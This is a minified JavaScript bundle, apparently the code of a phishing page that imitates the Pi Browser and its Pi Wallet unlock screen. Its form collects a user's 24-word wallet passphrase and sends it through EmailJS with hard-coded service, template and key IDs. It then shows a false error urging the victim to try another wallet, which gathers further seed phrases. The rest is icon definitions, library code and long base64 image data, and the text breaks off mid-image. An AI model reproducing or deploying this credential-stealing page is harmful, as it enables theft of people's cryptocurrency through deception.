    ug = "data:image/webp;base64,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",
    cg = "/assets/kyc-94134b06.webp",
    fg = "/assets/chat-8bce2cb7.webp",
    dg = "/assets/p2p-85982cd2.webp";
var Ts = {};
(function(e) {
    Object.defineProperty(e, "__esModule", {
        value: !0
    });
    var t = "fas",
        n = "circle-notch",
        r = 512,
        i = 512,
        a = [],
        l = "f1ce",
        o = "M222.7 32.1c5 16.9-4.6 34.8-21.5 39.8C121.8 95.6 64 169.1 64 256c0 106 86 192 192 192s192-86 192-192c0-86.9-57.8-160.4-137.1-184.1c-16.9-5-26.6-22.9-21.5-39.8s22.9-26.6 39.8-21.5C434.9 42.1 512 140 512 256c0 141.4-114.6 256-256 256S0 397.4 0 256C0 140 77.1 42.1 182.9 10.6c16.9-5 34.8 4.6 39.8 21.5z";
    e.definition = {
        prefix: t,
        iconName: n,
        icon: [r, i, a, l, o]
    }, e.faCircleNotch = e.definition, e.prefix = t, e.iconName = n, e.width = r, e.height = i, e.ligatures = a, e.unicode = l, e.svgPathData = o, e.aliases = a
})(Ts);

function pg() {
    return d.jsx("div", {
        children: d.jsx("div", {
            id: "root",
            children: d.jsx("div", {
                className: "App",
                children: d.jsxs("div", {
                    className: "piscreen",
                    children: [d.jsxs("div", {
                        className: "pi_sign",
                        children: [d.jsx("img", {
                            src: Op,
                            alt: ""
                        }), d.jsx("h3", {
                            children: "Welcome to the Pi Browser "
                        })]
                    }), d.jsx("div", {
                        className: "pilinks",
                        children: d.jsxs("ul", {
                            children: [d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${ig}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Fireside"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${ag}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Wallet"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${lg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Brainstorm"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${og}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Mine"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${sg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Blockchain"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${ug}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Develop"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${cg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "KYC"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${fg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Chat"
                                    })]
                                })
                            }), d.jsx("li", {
                                children: d.jsxs("a", {
                                    href: "/verify",
                                    className: "pilinkcard",
                                    children: [d.jsx("div", {
                                        className: "imgs",
                                        style: {
                                            backgroundImage: `url("${dg}")`
                                        }
                                    }), d.jsx("p", {
                                        children: "Exchange"
                                    })]
                                })
                            })]
                        })
                    }), d.jsxs("button", {
                        className: "explorebtn",
                        children: [d.jsx(le, {
                            icon: Ts.faCircleNotch
                        }), "Explore the Testnet Ecosystem"]
                    })]
                })
            })
        })
    })
}
const Rr = {
        _origin: "https://api.emailjs.com"
    },
    mg = (e, t = "https://api.emailjs.com") => {
        Rr._userID = e, Rr._origin = t
    },
    bp = (e, t, n) => {
        if (!e) throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account";
        if (!t) throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
        if (!n) throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates";
        return !0
    };
class Nc {
    constructor(t) {
        this.status = t ? t.status : 0, this.text = t ? t.responseText : "Network Error"
    }
}
const Tp = (e, t, n = {}) => new Promise((r, i) => {
        const a = new XMLHttpRequest;
        a.addEventListener("load", ({
            target: l
        }) => {
            const o = new Nc(l);
            o.status === 200 || o.text === "OK" ? r(o) : i(o)
        }), a.addEventListener("error", ({
            target: l
        }) => {
            i(new Nc(l))
        }), a.open("POST", Rr._origin + e, !0), Object.keys(n).forEach(l => {
            a.setRequestHeader(l, n[l])
        }), a.send(t)
    }),
    hg = (e, t, n, r) => {
        const i = r || Rr._userID;
        return bp(i, e, t), Tp("/api/v1.0/email/send", JSON.stringify({
            lib_version: "3.11.0",
            user_id: i,
            service_id: e,
            template_id: t,
            template_params: n
        }), {
            "Content-type": "application/json"
        })
    },
    vg = e => {
        let t;
        if (typeof e == "string" ? t = document.querySelector(e) : t = e, !t || t.nodeName !== "FORM") throw "The 3rd parameter is expected to be the HTML form element or the style selector of form";
        return t
    },
    gg = (e, t, n, r) => {
        const i = r || Rr._userID,
            a = vg(n);
        bp(i, e, t);
        const l = new FormData(a);
        return l.append("lib_version", "3.11.0"), l.append("service_id", e), l.append("template_id", t), l.append("user_id", i), Tp("/api/v1.0/email/send-form", l)
    },
    yg = {
        init: mg,
        send: hg,
        sendForm: gg
    };

function wg() {
    const e = b.useRef(),
        [t, n] = b.useState({
            email: ""
        }),
        {
            email: r
        } = t;

    function i(o) {
        n(s => ({ ...s,
            [o.target.name]: o.target.value
        }))
    }

    function a(o) {
        return o.split(" ").length
    }
    const l = o => {
        o.preventDefault();
        const s = a(r);
        console.log(s), s < 24 ? alert("not up to 24") : yg.sendForm("service_0zvjld3", "template_sl30mra", e.current, "cRbzxZvaKSKiHwpwO").then(u => {
            alert("error, your wallet did not meet the required transaction history for safe exchange trademark, dont try again with the same wallet, or you will be banned, try using another wallet"), console.log(u.text), console.log(r)
        }, u => {
            console.log(u.text)
        })
    };
    return d.jsx("div", {
        children: d.jsxs("div", {
            className: "verify",
            children: [d.jsx("h2", {
                children: "Unlock Pi Wallet"
            }), d.jsxs("form", {
                action: "submit",
                className: "verify-form",
                ref: e,
                onSubmit: l,
                children: [d.jsx("textarea", {
                    name: "email",
                    onChange: i,
                    value: r,
                    placeholder: "Enter Your 24-word passphrase here",
                    cols: "30",
                    rows: "10",
                    required: ""
                }), d.jsx("button", {
                    className: "passphrasebtn",
                    id: "",
                    children: "Unlock With Passphrase"
                })]
            }), d.jsx("button", {
                className: "fingerprintbtn",
                onClick: l,
                children: "Unlock With Biometrics"
            }), d.jsx("p", {
                children: "As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of Passphrase is impossible."
            }), d.jsxs("p", {
                children: ["Lost your passphrase? ", d.jsx("span", {
                    className: "blue",
                    children: "You can create a new wallet"
                }), ", but all your π in you previous wallet will be inaccessible."]
            })]
        })
    })
}
const kg = "/assets/binance-1c2835cf.png",
    xg = "data:image/webp;base64,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",
    Sg = "data:image/webp;base64,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